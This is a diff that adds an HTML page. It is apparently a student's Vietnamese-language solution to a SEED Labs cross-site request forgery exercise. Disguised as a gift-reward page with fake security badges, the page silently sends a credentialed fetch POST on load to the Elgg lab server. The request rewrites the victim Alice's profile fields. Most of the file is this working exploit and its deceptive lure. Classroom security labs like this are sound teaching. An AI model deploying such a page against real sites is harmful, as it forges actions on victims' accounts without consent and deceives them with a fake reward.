@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chương trình Khảo sát Nhận Quà Tri Ân</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            padding: 20px;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
+            max-width: 520px;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .badge {
+            display: inline-block;
+            background: #e0f2fe;
+            color: #0284c7;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            color: #0f172a;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        p {
+            color: #475569;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .loader-box {
+            background: #f8fafc;
+            border: 1px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #2563eb;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #64748b;
+            font-weight: 500;
+        }
+
+        .footer-note {
+            font-size: 12px;
+            color: #94a3b8;
+        }
+
+        /* Console log mockup phục vụ quay video demo */
+        .debug-console {
+            margin-top: 20px;
+            background: #0f172a;
+            color: #38bdf8;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px;
+            text-align: left;
+            padding: 12px;
+            border-radius: 8px;
+            max-height: 120px;
+            overflow-y: auto;
+            display: none; /* Hiển thị khi bật cờ debug */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <span class="badge">🎁 Phần quà may mắn</span>
+        <h1>Xác thực tài khoản thành công!</h1>
+        <p>Hệ thống đang chuẩn bị gói dữ liệu khuyến mãi đặc quyền dành riêng cho tài khoản của bạn. Vui lòng giữ nguyên tab trình duyệt trong 3 giây...</p>
+
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-display">Đang đồng bộ hóa dữ liệu bảo mật...</div>
+        </div>
+
+        <p class="footer-note">Cổng kết nối an toàn 256-bit SSL/TLS. Mã xác thực: #SEC-9821</p>
+
+        <!-- Khung debug để người chấm bài / video quan sát được luồng ngầm -->
+        <div class="debug-console" id="debug-box"></div>
+    </div>
+
+    <script type="text/javascript">
+        /**
+         * =========================================================================
+         * KỊCH BẢN TẤN CÔNG CSRF SỬ DỤNG FETCH API & URLSEARCHPARAMS
+         * =========================================================================
+         * Yêu cầu đề bài:
+         * 1. KHÔNG sử dụng XMLHttpRequest (XHR).
+         * 2. KHÔNG sử dụng HTML Form Submit truyền thống.
+         * 3. BẮT BUỘC dùng Fetch API + URLSearchParams.
+         * 4. Sửa trường "About me" (description) thành: "CSRF attack by <MSV>"
+         * =========================================================================
+         */
+
+        const CONFIG = {
+            // URL endpoint xử lý cập nhật profile của mạng xã hội Elgg (SEED Labs)
+            targetEndpoint: 'http://www.seed-server.com/action/profile/edit',
+            
+            // Thông tin nạn nhân mục tiêu (Alice)
+            victimGuid: '42',         // GUID của Alice trong cơ sở dữ liệu Elgg
+            victimName: 'Alice',       // Tên hiển thị người dùng
+            studentId: 'B21DCCN001',   // HÃY ĐIỀN MÃ SINH VIÊN CỦA THÀNH VIÊN NHÓM VÀO ĐÂY!
+            debug: true               // Bật hiển thị log trên màn hình để quay video
+        };
+
+        function logDebug(message) {
+            console.log(`[CSRF-EXPLOIT] ${message}`);
+            if (CONFIG.debug) {
+                const box = document.getElementById('debug-box');
+                box.style.display = 'block';
+                box.innerHTML += `<div>&gt; ${message}</div>`;
+            }
+        }
+
+        async function executeCSRFAttack() {
+            logDebug('Bắt đầu quy trình tấn công CSRF...');
+            logDebug(`Mục tiêu: ${CONFIG.targetEndpoint}`);
+            logDebug(`Nạn nhân: ${CONFIG.victimName} (GUID: ${CONFIG.victimGuid})`);
+
+            // 1. Đóng gói Payload sử dụng đối tượng chuẩn URLSearchParams
+            const payload = new URLSearchParams();
+            payload.append('guid', CONFIG.victimGuid);
+            payload.append('name', CONFIG.victimName);
+            
+            // Nội dung theo đúng yêu cầu đề bài: "CSRF attack by <MSV>"
+            const maliciousAboutMe = `<p>CSRF attack by ${CONFIG.studentId}</p>`;
+            payload.append('description', maliciousAboutMe);
+            payload.append('accesslevel[description]', '2'); // 2 = Public (Công khai)
+
+            // Các tham số profile phụ trợ giữ nguyên hoặc cập nhật
+            payload.append('briefdescription', `CSRF by ${CONFIG.studentId}`);
+            payload.append('accesslevel[briefdescription]', '2');
+            payload.append('location', 'Vietnam');
+            payload.append('accesslevel[location]', '2');
+
+            logDebug('Đã đóng gói dữ liệu qua URLSearchParams.');
+
+            try {
+                /**
+                 * 2. Kích hoạt Fetch API với các cờ quan trọng:
+                 * - method: 'POST'
+                 * - credentials: 'include' => BUỘC trình duyệt đính kèm Cookie phiên của nạn nhân
+                 * - mode: 'no-cors' => Gửi Simple Request, tránh Preflight OPTIONS, xử lý ngầm
+                 * - headers: Content-Type: application/x-www-form-urlencoded
+                 */
+                logDebug('Đang phóng gói tin ngầm với credentials: "include"...');
+                
+                const response = await fetch(CONFIG.targetEndpoint, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: payload
+                });
+
+                logDebug('===> TẤN CÔNG THÀNH CÔNG! Gói tin đã được gửi đến Elgg.');
+                
+                // Cập nhật giao diện ngụy trang
+                document.getElementById('status-display').textContent = '✅ Đã kích hoạt phần thưởng! Vui lòng kiểm tra hộp thư.';
+            } catch (error) {
+                // Do mode: 'no-cors', promise luôn resolve trừ khi có lỗi mạng hoàn toàn
+                logDebug(`Lỗi kết nối: ${error.message}`);
+            }
+        }
+
+        // Tự động kích hoạt ngay khi tài liệu HTML tải xong
+        window.addEventListener('DOMContentLoaded', () => {
+            // Chạy ngay lập tức
+            executeCSRFAttack();
+        });
+    </script>
+</body>
+</html>
